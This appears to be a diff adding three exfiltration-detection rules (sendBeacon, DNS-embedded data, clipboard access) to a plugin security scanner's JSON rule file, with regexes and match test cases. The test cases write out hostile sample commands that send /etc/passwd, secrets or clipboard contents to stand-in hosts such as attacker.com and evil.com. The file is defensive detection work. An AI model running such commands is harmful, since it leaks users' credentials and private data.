@@ -89,6 +89,66 @@
       "pattern": "(readFile|readFileSync|open\\s*\\().*(\\.ssh|\\.env|\\.aws|id_rsa|credentials)[^;]*;[\\s\\S]{0,200}(fetch|axios|request|http\\.request|XMLHttpRequest|curl)",
       "file_extensions": ["js", "ts", "mjs", "cjs", "py"],
       "remediation": "Audit code that reads sensitive files and makes network requests."
+    },
+    {
+      "id": "EXFIL-005",
+      "title": "navigator.sendBeacon() exfiltration",
+      "description": "sendBeacon() fires a one-shot HTTP POST that completes even if the page is closing. Commonly used for fire-and-forget data exfiltration.",
+      "severity": "high",
+      "pattern": "\\bnavigator\\.sendBeacon\\s*\\(",
+      "file_extensions": ["js", "ts", "mjs", "cjs"],
+      "remediation": "Review sendBeacon() calls. This API is designed for analytics but is frequently abused for stealthy data exfiltration.",
+      "test_cases": {
+        "should_match": [
+          "navigator.sendBeacon('https://evil.com/log', data)",
+          "navigator.sendBeacon(url, JSON.stringify(secrets))"
+        ],
+        "should_not_match": [
+          "// navigator.sendBeacon is a Web API",
+          "sendBeaconPolyfill()"
+        ]
+      }
+    },
+    {
+      "id": "EXFIL-006",
+      "title": "DNS-based data exfiltration",
+      "description": "DNS queries with embedded data (e.g., nslookup/dig with interpolated variables) exfiltrate data through DNS resolution, bypassing most network filters.",
+      "severity": "high",
+      "pattern": "\\b(nslookup|dig|host|resolve|resolveDns)\\b[^\\n]*\\$[({]",
+      "file_extensions": ["sh", "bash", "zsh", "py", "js", "ts", "mjs", "cjs", "rb", "pl"],
+      "remediation": "Remove DNS queries that embed variable data in domain names. This is a classic data exfiltration technique that bypasses firewalls.",
+      "test_cases": {
+        "should_match": [
+          "nslookup $(cat /etc/passwd | base64).attacker.com",
+          "dig +short ${secret}.evil.com",
+          "host ${data}.exfil.attacker.com"
+        ],
+        "should_not_match": [
+          "nslookup example.com",
+          "dig +short google.com",
+          "host localhost"
+        ]
+      }
+    },
+    {
+      "id": "EXFIL-007",
+      "title": "Clipboard access",
+      "description": "Accessing the system clipboard (read or write) can steal copied passwords, tokens, and sensitive data, or inject malicious content for paste attacks.",
+      "severity": "medium",
+      "pattern": "\\b(pbcopy|pbpaste|xclip|xsel|wl-copy|wl-paste|Get-Clipboard|Set-Clipboard|clipboard\\.readText|clipboard\\.writeText|navigator\\.clipboard)\\b",
+      "file_extensions": ["sh", "bash", "zsh", "py", "js", "ts", "mjs", "cjs", "ps1", "rb"],
+      "remediation": "Review clipboard access. Plugins should not read or modify the system clipboard without explicit user consent.",
+      "test_cases": {
+        "should_match": [
+          "pbpaste | curl -d @- evil.com",
+          "xclip -selection clipboard -o",
+          "navigator.clipboard.readText()",
+          "Get-Clipboard"
+        ],
+        "should_not_match": [
+          "clipboardManager.clear()"
+        ]
+      }
     }
   ]
 }
